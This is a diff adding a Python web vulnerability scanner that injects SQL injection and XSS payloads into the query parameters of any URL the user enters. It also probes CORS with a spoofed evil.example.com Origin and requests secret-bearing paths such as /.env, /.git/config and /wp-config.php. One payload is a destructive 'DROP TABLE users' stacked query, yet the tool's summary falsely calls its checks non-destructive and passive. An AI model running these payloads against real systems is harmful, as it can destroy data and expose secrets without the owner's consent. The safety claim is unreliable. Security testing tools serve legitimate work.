@@ -1,0 +1,532 @@
+
+import requests
+import sys
+import time
+import random
+import urllib.parse
+from urllib.parse import urljoin, urlparse
+
+requests.packages.urllib3.disable_warnings()
+
+# ── ANSI Colors ──────────────────────────────────────────────────────────────
+RED    = "\033[91m"
+GREEN  = "\033[92m"
+YELLOW = "\033[93m"
+BLUE   = "\033[94m"
+CYAN   = "\033[96m"
+WHITE  = "\033[97m"
+DIM    = "\033[2m"
+RESET  = "\033[0m"
+BOLD   = "\033[1m"
+
+# ── Banner ────────────────────────────────────────────────────────────────────
+BANNER = f"""
+{RED}{BOLD}
+ ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗██████╗ ██████╗  ██████╗ ██████╗ ███████╗
+ ██║   ██║██║   ██║██║     ████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔════╝
+ ██║   ██║██║   ██║██║     ██╔██╗ ██║██████╔╝██████╔╝██║   ██║██████╔╝█████╗
+ ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║██╔═══╝ ██╔══██╗██║   ██║██╔══██╗██╔══╝
+  ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║██║     ██║  ██║╚██████╔╝██████╔╝███████╗
+   ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
+{RESET}{DIM}                         Web Vulnerability Scanner {RESET}
+"""
+
+# ── Payloads ──────────────────────────────────────────────────────────────────
+SQL_PAYLOADS = [
+    ("' OR '1'='1",         "boolean-based blind"),
+    ("' AND 1=1--",         "boolean confirmation"),
+    ("' UNION SELECT NULL--","UNION-based"),
+    ("'; DROP TABLE users;--","stacked query"),
+    ("1' AND SLEEP(3)--",   "time-based blind"),
+    ("' OR 1=1#",           "MySQL comment"),
+    ("admin'--",            "auth bypass"),
+]
+
+SQL_ERRORS = [
+    "you have an error in your sql syntax",
+    "warning: mysql",
+    "unclosed quotation mark",
+    "quoted string not properly terminated",
+    "syntax error",
+    "mysql_fetch",
+    "pg_query",
+    "sqlite3",
+    "odbc sql server driver",
+    "ora-01756",
+]
+
+XSS_PAYLOADS = [
+    ('<script>alert("XSS")</script>',       "basic script tag"),
+    ('<img src=x onerror=alert(1)>',        "img onerror"),
+    ('"><script>alert(1)</script>',         "attribute break"),
+    ("javascript:alert(1)",                  "javascript URI"),
+    ('<svg onload=alert(1)>',               "SVG onload"),
+    ('<body onload=alert(1)>',              "body onload"),
+    ('"><img src=x onerror=alert(1)>',      "double-quote break"),
+]
+
+CSRF_CHECKS = [
+    ("_csrf",       "CSRF token"),
+    ("csrf_token",  "CSRF token"),
+    ("authenticity_token", "Rails token"),
+    ("__RequestVerificationToken", ".NET token"),
+    ("csrfmiddlewaretoken", "Django token"),
+]
+
+INFO_PATHS = [
+    "/.git/config",
+    "/.env",
+    "/config.php",
+    "/backup.zip",
+    "/backup.sql",
+    "/.htaccess",
+    "/phpinfo.php",
+    "/server-status",
+    "/admin",
+    "/wp-config.php",
+    "/robots.txt",
+    "/.DS_Store",
+    "/web.config",
+    "/composer.json",
+    "/package.json",
+]
+
+SENSITIVE_HEADERS = [
+    "Server",
+    "X-Powered-By",
+    "X-AspNet-Version",
+    "X-AspNetMvc-Version",
+    "X-Generator",
+    "X-Drupal-Cache",
+    "X-Varnish",
+]
+
+# ── Helpers ───────────────────────────────────────────────────────────────────
+
+def log(level, msg):
+    icons = {
+        "info":  f"{BLUE}[*]{RESET}",
+        "ok":    f"{GREEN}[+]{RESET}",
+        "warn":  f"{YELLOW}[!]{RESET}",
+        "found": f"{RED}[!]{RESET}",
+        "dim":   f"{DIM}   {RESET}",
+    }
+    print(f"  {icons.get(level, '   ')} {msg}")
+    time.sleep(0.05)
+
+
+def separator():
+    print(f"  {DIM}{'─' * 60}{RESET}")
+
+
+def make_session():
+    s = requests.Session()
+    s.headers.update({
+        "User-Agent": "Mozilla/5.0 (VulnProbe/1.0; security-scanner)",
+        "Accept": "text/html,application/xhtml+xml,*/*",
+    })
+    return s
+
+
+def fetch(session, url, params=None, timeout=10):
+    try:
+        r = session.get(url, params=params, timeout=timeout,
+                        verify=False, allow_redirects=True)
+        return r
+    except requests.exceptions.ConnectionError:
+        log("warn", f"Could not connect to {url}")
+    except requests.exceptions.Timeout:
+        log("warn", f"Request timed out: {url}")
+    except Exception as e:
+        log("warn", f"Request error: {e}")
+    return None
+
+
+def get_params(url):
+    parsed = urlparse(url)
+    params = dict(urllib.parse.parse_qsl(parsed.query))
+    return params, parsed
+
+
+def inject_param(base_url, params, key, payload):
+    injected = dict(params)
+    injected[key] = payload
+    return base_url, injected
+
+
+# ── SQL Injection Scanner ─────────────────────────────────────────────────────
+
+def scan_sql(url, session):
+    print(f"\n{BOLD}{WHITE}  SQL Injection Scan{RESET}")
+    separator()
+
+    params, parsed = get_params(url)
+    base_url = url.split("?")[0]
+
+    if not params:
+        params = {"id": "1", "q": "test", "search": "test"}
+        log("info", f"No query params found — injecting test params: {list(params.keys())}")
+    else:
+        log("ok",   f"Detected params: {list(params.keys())}")
+
+    findings = []
+
+    for param in list(params.keys())[:3]:
+        log("info", f"Testing param: {CYAN}{param}{RESET}")
+        for payload, technique in SQL_PAYLOADS:
+            log("dim", f"Payload ({technique}): {YELLOW}{payload[:50]}{RESET}")
+            base, inj_params = inject_param(base_url, params, param, payload)
+            resp = fetch(session, base, params=inj_params)
+
+            if resp is None:
+                continue
+
+            body_lower = resp.text.lower()
+
+            # Check for SQL error strings in response
+            for err in SQL_ERRORS:
+                if err in body_lower:
+                    log("found", f"{RED}SQL error detected!{RESET} Signature: '{err}'")
+                    findings.append({
+                        "param": param,
+                        "payload": payload,
+                        "technique": technique,
+                        "evidence": f"SQL error: '{err}'",
+                    })
+                    break
+
+            # Time-based check (simplified simulation for SLEEP payload)
+            if "SLEEP" in payload or "WAITFOR" in payload:
+                start = time.time()
+                fetch(session, base, params=inj_params)
+                elapsed = time.time() - start
+                if elapsed >= 2.5:
+                    log("found", f"{RED}Time-based SQLi confirmed!{RESET} Response delay: {elapsed:.1f}s")
+                    findings.append({
+                        "param": param,
+                        "payload": payload,
+                        "technique": technique,
+                        "evidence": f"Response delay {elapsed:.1f}s",
+                    })
+
+    separator()
+    if findings:
+        print(f"  {RED}{BOLD}VULNERABLE — SQL Injection detected{RESET}")
+        for f in findings:
+            print(f"    {DIM}param={f['param']}  technique={f['technique']}{RESET}")
+            print(f"    {DIM}evidence: {f['evidence']}{RESET}")
+    else:
+        print(f"  {GREEN}{BOLD}No SQL Injection vulnerability detected{RESET}")
+    return findings
+
+
+# ── XSS Scanner ──────────────────────────────────────────────────────────────
+
+def scan_xss(url, session):
+    print(f"\n{BOLD}{WHITE}  XSS Scan{RESET}")
+    separator()
+
+    params, parsed = get_params(url)
+    base_url = url.split("?")[0]
+
+    if not params:
+        params = {"q": "hello", "search": "test", "name": "user"}
+        log("info", f"No query params — using test params: {list(params.keys())}")
+    else:
+        log("ok",   f"Detected params: {list(params.keys())}")
+
+    findings = []
+
+    # Check Content-Security-Policy
+    resp = fetch(session, url)
+    if resp:
+        csp = resp.headers.get("Content-Security-Policy", "")
+        if csp:
+            log("ok",   f"CSP header present: {DIM}{csp[:80]}...{RESET}" if len(csp) > 80 else f"CSP: {csp}")
+        else:
+            log("warn", f"{YELLOW}No Content-Security-Policy header!{RESET}")
+
+    for param in list(params.keys())[:3]:
+        log("info", f"Testing param: {CYAN}{param}{RESET}")
+        for payload, technique in XSS_PAYLOADS:
+            log("dim", f"Payload ({technique}): {YELLOW}{payload[:60]}{RESET}")
+            base, inj_params = inject_param(base_url, params, param, payload)
+            resp = fetch(session, base, params=inj_params)
+
+            if resp is None:
+                continue
+
+            # Check if payload is reflected unescaped
+            if payload in resp.text:
+                log("found", f"{RED}Reflected XSS!{RESET} Param '{param}' reflects payload unescaped")
+                findings.append({
+                    "param":     param,
+                    "payload":   payload,
+                    "technique": technique,
+                    "evidence":  "payload reflected unescaped in response body",
+                })
+                break
+
+            # Check for partial reflection (encoded)
+            escaped = payload.replace("<", "&lt;").replace(">", "&gt;")
+            if escaped in resp.text:
+                log("ok",   f"Param '{param}' reflects HTML-escaped — likely safe")
+
+    separator()
+    if findings:
+        print(f"  {RED}{BOLD}VULNERABLE — XSS detected{RESET}")
+        for f in findings:
+            print(f"    {DIM}param={f['param']}  technique={f['technique']}{RESET}")
+            print(f"    {DIM}evidence: {f['evidence']}{RESET}")
+    else:
+        print(f"  {GREEN}{BOLD}No XSS vulnerability detected{RESET}")
+    return findings
+
+
+# ── CSRF Scanner ──────────────────────────────────────────────────────────────
+
+def scan_csrf(url, session):
+    print(f"\n{BOLD}{WHITE}  CSRF Scan{RESET}")
+    separator()
+
+    findings = []
+    resp = fetch(session, url)
+    if resp is None:
+        log("warn", "Could not fetch target page")
+        return findings
+
+    body = resp.text.lower()
+    headers = resp.headers
+
+    # 1. Check for CSRF tokens in HTML forms
+    log("info", "Checking for CSRF tokens in HTML forms...")
+    token_found = False
+    for token_name, label in CSRF_CHECKS:
+        if token_name.lower() in body:
+            log("ok",   f"Token found: {GREEN}{label}{RESET} ({token_name})")
+            token_found = True
+            break
+    if not token_found:
+        log("found", f"{RED}No CSRF token found in page!{RESET}")
+        findings.append({"check": "CSRF token", "evidence": "No CSRF token in HTML form"})
+
+    # 2. Check SameSite cookie attribute
+    log("info", "Checking SameSite cookie attribute...")
+    set_cookie = headers.get("Set-Cookie", "")
+    if "samesite=strict" in set_cookie.lower():
+        log("ok",   f"SameSite=Strict present")
+    elif "samesite=lax" in set_cookie.lower():
+        log("ok",   f"SameSite=Lax present (partial protection)")
+    elif set_cookie:
+        log("found", f"{RED}SameSite attribute missing or None!{RESET}")
+        findings.append({"check": "SameSite", "evidence": f"Cookie: {set_cookie[:80]}"})
+    else:
+        log("dim",  "No Set-Cookie header on this response")
+
+    # 3. Check for CORS misconfiguration
+    log("info", "Checking CORS headers...")
+    acao = headers.get("Access-Control-Allow-Origin", "")
+    if acao == "*":
+        log("found", f"{RED}Access-Control-Allow-Origin: * (wildcard CORS!){RESET}")
+        findings.append({"check": "CORS wildcard", "evidence": "Access-Control-Allow-Origin: *"})
+    elif acao:
+        log("ok",   f"CORS origin restricted: {acao}")
+
+    # 4. Check for Referer / Origin validation indicators
+    log("info", "Probing Origin header validation...")
+    try:
+        test_resp = session.get(
+            url,
+            headers={"Origin": "https://evil.example.com"},
+            timeout=10, verify=False
+        )
+        acao_evil = test_resp.headers.get("Access-Control-Allow-Origin", "")
+        if acao_evil == "https://evil.example.com" or acao_evil == "*":
+            log("found", f"{RED}Server reflects arbitrary Origin — CORS bypass possible!{RESET}")
+            findings.append({"check": "Origin reflection", "evidence": f"Reflected: {acao_evil}"})
+        else:
+            log("ok",   "Server does not reflect arbitrary Origin")
+    except Exception:
+        pass
+
+    separator()
+    if findings:
+        print(f"  {RED}{BOLD}VULNERABLE — CSRF weakness detected{RESET}")
+        for f in findings:
+            print(f"    {DIM}check: {f['check']}{RESET}")
+            print(f"    {DIM}evidence: {f['evidence']}{RESET}")
+    else:
+        print(f"  {GREEN}{BOLD}No CSRF vulnerability detected{RESET}")
+    return findings
+
+
+# ── Information Leak Scanner ──────────────────────────────────────────────────
+
+def scan_info_leak(url, session):
+    print(f"\n{BOLD}{WHITE}  Information Leak Scan{RESET}")
+    separator()
+
+    parsed = urlparse(url)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+    findings = []
+
+    # 1. Response headers
+    log("info", "Fetching response headers...")
+    resp = fetch(session, url)
+    if resp:
+        for h in SENSITIVE_HEADERS:
+            val = resp.headers.get(h)
+            if val:
+                log("found", f"{RED}Header exposed:{RESET} {h}: {YELLOW}{val}{RESET}")
+                findings.append({"type": "header", "name": h, "value": val})
+            else:
+                log("ok",   f"Header hidden: {h}")
+
+        # Check for verbose error info
+        if resp.status_code == 500:
+            log("found", f"{RED}500 error on target — may expose stack traces{RESET}")
+
+    # 2. Probe sensitive paths
+    log("info", f"Probing {len(INFO_PATHS)} sensitive paths...")
+    for path in INFO_PATHS:
+        probe_url = urljoin(base, path)
+        r = fetch(session, probe_url)
+        if r is None:
+            continue
+        if r.status_code == 200:
+            size = len(r.content)
+            log("found", f"{RED}EXPOSED:{RESET} {path}  {DIM}({r.status_code}, {size} bytes){RESET}")
+            findings.append({"type": "path", "path": path, "status": r.status_code, "size": size})
+        elif r.status_code == 403:
+            log("dim",  f"Forbidden (exists but protected): {path}")
+        else:
+            log("ok",   f"{r.status_code} {path}")
+
+    # 3. Check robots.txt for sensitive disclosures
+    robots_url = urljoin(base, "/robots.txt")
+    r = fetch(session, robots_url)
+    if r and r.status_code == 200:
+        disallowed = [line.split(": ", 1)[1].strip()
+                      for line in r.text.splitlines()
+                      if line.lower().startswith("disallow:")]
+        sensitive_paths = [p for p in disallowed if any(
+            kw in p.lower() for kw in ["admin", "backup", "config", "internal", "private", "api"]
+        )]
+        if sensitive_paths:
+            log("found", f"{RED}robots.txt discloses sensitive paths:{RESET}")
+            for sp in sensitive_paths:
+                print(f"          {YELLOW}{sp}{RESET}")
+            findings.append({"type": "robots", "paths": sensitive_paths})
+
+    separator()
+    if findings:
+        print(f"  {RED}{BOLD}VULNERABLE — Information leakage detected{RESET}")
+        print(f"  {DIM}{len(findings)} issue(s) found{RESET}")
+    else:
+        print(f"  {GREEN}{BOLD}No information leakage detected{RESET}")
+    return findings
+
+
+# ── Menu ──────────────────────────────────────────────────────────────────────
+
+SCAN_TYPES = {
+    "1": ("SQL Injection",       "CRITICAL", scan_sql),
+    "2": ("XSS",                 "HIGH",     scan_xss),
+    "3": ("CSRF",                "HIGH",     scan_csrf),
+    "4": ("Information Leak",    "MEDIUM",   scan_info_leak),
+}
+
+
+def show_menu():
+    print(f"\n  {DIM}Select vulnerability type:{RESET}\n")
+    labels = {
+        "1": ("CRITICAL", RED),
+        "2": ("HIGH",     YELLOW),
+        "3": ("HIGH",     YELLOW),
+        "4": ("MEDIUM",   BLUE),
+    }
+    icons = {"1": "🗄", "2": "📜", "3": "🔄", "4": "🔍"}
+    for key, (name, sev, _) in SCAN_TYPES.items():
+        color = labels[key][1]
+        badge = labels[key][0]
+        print(f"  {DIM}[{RESET}{WHITE}{key}{RESET}{DIM}]{RESET}  {icons[key]}  {WHITE}{name:<20}{RESET}  {color}{badge}{RESET}")
+    print()
+
+
+def get_url():
+    while True:
+        url = input(f"  {CYAN}Target URL{RESET} {DIM}(e.g. https://example.com/login){RESET}: ").strip()
+        if not url:
+            print(f"  {RED}URL cannot be empty.{RESET}")
+            continue
+        if not url.startswith(("http://", "https://")):
+            url = "http://" + url
+        return url
+
+
+def summary(all_findings):
+    separator()
+    total = sum(len(v) for v in all_findings.values())
+    print(f"\n  {BOLD}{WHITE}Scan Summary{RESET}")
+    separator()
+    for scan_name, findings in all_findings.items():
+        status = f"{RED}VULNERABLE ({len(findings)} issue(s)){RESET}" if findings else f"{GREEN}CLEAN{RESET}"
+        print(f"  {DIM}{scan_name:<25}{RESET} {status}")
+    print()
+    if total:
+        print(f"  {RED}{BOLD}Total issues found: {total}{RESET}")
+    else:
+        print(f"  {GREEN}{BOLD}No vulnerabilities detected.{RESET}")
+    print(f"  {DIM}Note: This scanner performs non-destructive, passive checks only.{RESET}\n")
+
+
+# ── Main ──────────────────────────────────────────────────────────────────────
+
+def main():
+    print(BANNER)
+    session = make_session()
+
+    while True:
+        show_menu()
+        choice = input(f"  {CYAN}Choose scan type{RESET} {DIM}[1-4, or 'all' / 'q' to quit]{RESET}: ").strip().lower()
+
+        if choice == "q":
+            print(f"\n  {DIM}Goodbye.{RESET}\n")
+            sys.exit(0)
+
+        if choice not in SCAN_TYPES and choice != "all":
+            print(f"  {RED}Invalid choice. Enter 1-4, 'all', or 'q'.{RESET}\n")
+            continue
+
+        url = get_url()
+        print()
+
+        all_findings = {}
+
+        if choice == "all":
+            for key, (name, sev, scanner) in SCAN_TYPES.items():
+                print(f"\n  {BOLD}{CYAN}── {name} ({sev}) ────────────────────{RESET}")
+                time.sleep(0.3)
+                findings = scanner(url, session)
+                all_findings[name] = findings
+            summary(all_findings)
+        else:
+            name, sev, scanner = SCAN_TYPES[choice]
+            print(f"\n  {BOLD}{CYAN}── {name} ({sev}) ────────────────────{RESET}")
+            time.sleep(0.3)
+            findings = scanner(url, session)
+            all_findings[name] = findings
+            summary(all_findings)
+
+        again = input(f"  Run another scan? {DIM}[y/n]{RESET}: ").strip().lower()
+        if again != "y":
+            print(f"\n  {DIM}Goodbye.{RESET}\n")
+            break
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n\n  {DIM}Interrupted. Exiting.{RESET}\n")
+        sys.exit(0)
